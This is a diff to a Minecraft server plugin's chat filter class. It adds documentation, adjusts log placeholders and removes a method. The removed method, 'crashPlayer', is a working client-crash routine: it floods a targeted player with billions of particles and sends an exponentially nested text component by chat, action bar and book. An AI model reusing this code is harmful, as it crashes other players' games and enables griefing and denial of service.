@@ -2,10 +2,6 @@ package eu.koolfreedom.filter;
 
 import eu.koolfreedom.config.ConfigEntry;
 import eu.koolfreedom.utilities.FLog;
-import net.kyori.adventure.inventory.Book;
-import net.kyori.adventure.text.Component;
-import org.bukkit.Particle;
-import org.bukkit.entity.Player;
 
 import java.text.Normalizer;
 import java.util.ArrayList;
@@ -13,6 +9,10 @@ import java.util.List;
 import java.util.regex.Pattern;
 import java.util.regex.PatternSyntaxException;
 
+/**
+ * Compiles configured regular expressions and checks normalized text against them.
+ * The immutable rule list can be safely read by asynchronous chat event handlers.
+ */
 public final class FilterService
 {
     private static final int REGEX_FLAGS = Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CASE;
@@ -20,6 +20,7 @@ public final class FilterService
 
     public FilterService() {}
 
+    /** Recompiles the configured rules; invalid expressions are logged and skipped. */
     public static void reload()
     {
         List<FilterRule> loadedRules = new ArrayList<>();
@@ -35,15 +36,16 @@ public final class FilterService
             }
             catch (PatternSyntaxException exception)
             {
-                FLog.warning("Ignoring invalid filter regex '{0}': {1}",
+                FLog.warning("Ignoring invalid filter regex '{}': {}",
                         expression, exception.getDescription());
             }
         }
 
         rules = List.copyOf(loadedRules);
-        FLog.info("Loaded {0} text filter rules", rules.size());
+        FLog.info("Loaded {} text filter rules", rules.size());
     }
 
+    /** Returns the first matching rule, or a no-match result for blank/unmatched text. */
     public FilterResult check(String input)
     {
         if (input == null || input.isBlank()) return FilterResult.noMatch();
@@ -65,25 +67,5 @@ public final class FilterService
         return Normalizer.normalize(input, Normalizer.Form.NFD)
                 .replaceAll("\\p{M}", "")
                 .replaceAll("[\\u200B-\\u200D\\uFEFF]", "");
-    }
-
-    public static void crashPlayer(Player victim)
-    {
-        victim.spawnParticle(
-                Particle.ASH,
-                victim.getLocation(),
-                Integer.MAX_VALUE,
-                1, 1, 1, 1,
-                null,
-                true
-        );
-
-        Component c = Component.text("LOLOLOLOLOLOLOL");
-        for (int i = 0; i < 50; ++i)
-            c = Component.translatable("%1$s%1$s%1$s", "%1$s%1$s%1$s", c);
-
-        victim.sendMessage(c);
-        victim.sendActionBar(c);
-        victim.openBook(Book.book(c, c, List.of(c)));
     }
 }
